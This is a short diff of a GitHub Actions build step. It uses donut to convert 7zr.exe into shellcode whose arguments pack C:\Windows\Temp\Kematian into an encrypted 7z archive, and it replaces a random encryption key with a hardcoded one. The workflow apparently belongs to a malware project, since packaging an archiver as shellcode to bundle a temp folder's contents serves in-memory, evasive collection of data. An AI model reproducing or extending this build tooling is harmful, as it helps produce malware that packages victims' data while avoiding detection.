@@ -49,15 +49,10 @@ jobs:
 
     - name: Convert 7zr to Shellcode with Encryption Key 
       run: |
-        # Generate random bytes for encryption key
-        $randomBytes = [byte[]]@(1..16 | ForEach-Object { Get-Random -Minimum 0 -Maximum 256 })
-        $aeskey = [System.Convert]::ToBase64String($randomBytes)
-        Write-Host "Decryption KEY: $aeskey" -ForegroundColor Green
-
-        # Define arguments for donut
+        Write-Host "Using a static encryption key" 
+        $aeskey = "ip1j5zFgal2nd2y0TDUU7Q=="
+        Write-Host "Decryption KEY: $aeskey" 
         $arguments = "a -t7z -mx=9 -mhe=on Kematian.7z C:\Windows\Temp\Kematian -p$aeskey"
-
-        # Run donut.exe to convert 7zr to shellcode
         .\donut\donut.exe -i frontend-src\7zr.exe -x2 -a2 -p $arguments -o 7zr.bin -z 4
 
     - name: Upload Release Asset
